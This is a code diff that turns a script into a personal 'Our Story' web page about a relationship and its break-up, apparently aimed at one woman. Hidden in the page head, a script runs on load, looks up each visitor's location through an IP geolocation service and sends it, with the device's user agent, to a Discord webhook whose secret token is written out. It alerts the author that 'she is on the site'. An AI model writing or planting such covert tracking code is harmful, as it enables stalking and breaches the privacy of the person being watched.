@@ -1,77 +1,169 @@
-const CORRECT_DATE = "0818"; 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Our Story</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<script>
+  if (!localStorage.getItem('admin_view')) {
+    const webhookURL = "https://discord.com/api/webhooks/1500222826773348353/KPNKAKnthbbeUHNRlPZg8tiAGiQ6GLAM_ubxZb6jyzmYAWmPDOGssKGIbzra5Bab0Iwf";
+    
+    // On récupère les détails techniques
+    const device = navigator.userAgent;
 
-const loginScreen = document.getElementById('login-screen');
-const mainStory = document.getElementById('main-story');
-const passwordField = document.getElementById('passwordField');
-const errorMessage = document.getElementById('error-message');
+    // On récupère la localisation via une API externe
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const locationInfo = data.city && data.country_name 
+          ? `${data.city}, ${data.country_name}` 
+          : "Localisation inconnue";
 
-// Vérification de l'état au chargement
-window.onload = function() {
-    // On cache l'erreur par défaut au chargement
-    if (errorMessage) errorMessage.style.display = 'none';
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: "@everyone 👁️ Elle est sur le site",
+            embeds: [{
+              title: "Détails de la connexion 🌸",
+              color: 0xff0000,
+              fields: [
+                {
+                  name: "📍 Localisation",
+                  value: "```" + locationInfo + "```",
+                  inline: false
+                },
+                {
+                  name: "📱 Appareil & Navigateur",
+                  value: "```" + device + "```",
+                  inline: false
+                }
+              ],
+              footer: { text: "Signal détecté à l'instant" },
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      })
+      .catch(err => {
+        // Si la localisation échoue, on envoie quand même le ping de base
+        console.error('Erreur localisation, envoi du ping simple');
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: "@everyone 👁️ Elle est sur le site (Localisation échouée)",
+            embeds: [{
+              title: "Détails de la connexion 🌸",
+              color: 0xff0000,
+              fields: [{ name: "📱 Appareil", value: "```" + device + "```" }],
+              timestamp: new Date().toISOString()
+            }]
+          })
+        });
+      });
+  }
+</script>
+<body>
 
-    if (localStorage.getItem('isUnlocked') === 'true') {
-        if(loginScreen) loginScreen.style.display = 'none';
-        if(mainStory) mainStory.style.display = 'block';
-        updateCounters();
-    }
-};
+    <div id="login-screen">
+        <div class="password-content">
+            <h2>Access</h2>
+            <p class="hint">(Hint: It's my phone code)</p>
+            <input type="password" id="passwordField" inputmode="numeric">
+            <button id="unlockBtn">Unlock</button>
+            <p id="error-message">Wrong code.</p>
+        </div>
+    </div>
 
-function checkPassword() {
-    if (passwordField.value === CORRECT_DATE) {
-        localStorage.setItem('isUnlocked', 'true');
-        loginScreen.style.display = 'none';
-        mainStory.style.display = 'block';
-        updateCounters();
-    } else {
-        // N'affiche l'erreur que si le champ n'est pas vide
-        if (passwordField.value !== "") {
-            errorMessage.style.display = 'block';
-            passwordField.value = "";
-        }
-    }
-}
+    <div id="main-story" style="display: none;" class="with-bg">
+        <header class="story-header">
+            <h1>Our Journey</h1>
+            <p>Every step we took together.</p>
+        </header>
 
-function updateCounters() {
-    const startDate = new Date('2025-08-18T00:00:00');
-    const togetherDate = new Date('2025-09-09T00:00:00');
-    const now = new Date();
+        <div class="stats-container">
+            <div class="stat-group">
+                <span class="stat-label">Since we met : </span>
+                <div class="stat-values">
+                    <div class="stat-unit"><span id="met-days">0</span>d</div>
+                    <div class="stat-unit"><span id="met-hours">0</span>h</div>
+                    <div class="stat-unit"><span id="met-mins">0</span>m</div>
+                </div>
+            </div>
+            
+            <div class="stat-group">
+                <span class="stat-label">Since our story began : </span>
+                <div class="stat-values">
+                    <div class="stat-unit"><span id="together-days">0</span>d</div>
+                    <div class="stat-unit"><span id="together-hours">0</span>h</div>
+                    <div class="stat-unit"><span id="together-mins">0</span>m</div>
+                </div>
+            </div>
+        </div>
 
-    function calculate(targetDate, prefix) {
-        const diff = now - targetDate;
-        
-        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
-        const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
-        const mins = Math.floor((diff / 1000 / 60) % 60);
+        <div class="container">
+            <a href="chapter1.html" class="chapter-link">
+                <section class="story-card">
+                    <div class="category-tag">Chapter 1</div>
+                    <h3>Day Zero</h3>
+                </section>
+            </a>
 
-        const dElem = document.getElementById(prefix + '-days');
-        const hElem = document.getElementById(prefix + '-hours');
-        const mElem = document.getElementById(prefix + '-mins');
+            <a href="chapter2.html" class="chapter-link">
+                <section class="story-card">
+                    <div class="category-tag">Chapter 2</div>
+                    <h3>Late Night Whispers</h3>
+                </section>
+            </a>
 
-        if (dElem) dElem.innerText = days;
-        if (hElem) hElem.innerText = hours;
-        if (mElem) mElem.innerText = mins;
-    }
+            <a href="chapter3.html" class="chapter-link">
+                <section class="story-card">
+                    <div class="category-tag">Chapter 3</div>
+                    <h3>The Point of No Return</h3>
+                </section>
+            </a>
 
-    calculate(startDate, 'met');
-    calculate(togetherDate, 'together');
-}
+            <a href="chapter4.html" class="chapter-link">
+                <section class="story-card">
+                    <div class="category-tag">Chapter 4</div>
+                    <h3>The Relation</h3>
+                </section>
+            </a>
 
-// Mise à jour chaque minute
-setInterval(updateCounters, 60000);
+            <a href="music.html" class="chapter-link">
+                <section class="story-card">
+                    <div class="category-tag">Playlist</div>
+                    <h3>Songs</h3>
+                </section>
+            </a>
 
-// Écouteurs d'événements
-if(document.getElementById('unlockBtn')) {
-    document.getElementById('unlockBtn').addEventListener('click', checkPassword);
-}
+            <a href="reflections.html" class="chapter-link">
+                <section class="story-card">
+                    <div class="category-tag">Reflections</div>
+                    <h3>Borrowed Words</h3>
+                </section>
+            </a>
 
-if(passwordField) {
-    passwordField.addEventListener('keypress', (e) => { 
-        if (e.key === 'Enter') checkPassword(); 
-    });
+            <a href="journal.html" class="chapter-link">
+                <section class="story-card">
+                    <div class="category-tag">Journal</div>
+                    <h3>My Break Up Journal</h3>
+                </section>
+            </a>
 
-    // Cache l'erreur quand l'utilisateur tape à nouveau
-    passwordField.addEventListener('input', () => {
-        if (errorMessage) errorMessage.style.display = 'none';
-    });
-}
+            <a href="today.html" class="chapter-link">
+                <section class="story-card">
+                    <div class="category-tag">Today</div>
+                    <h3>The Present Chapter</h3>
+                </section>
+            </a>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+
+</body>
+</html>
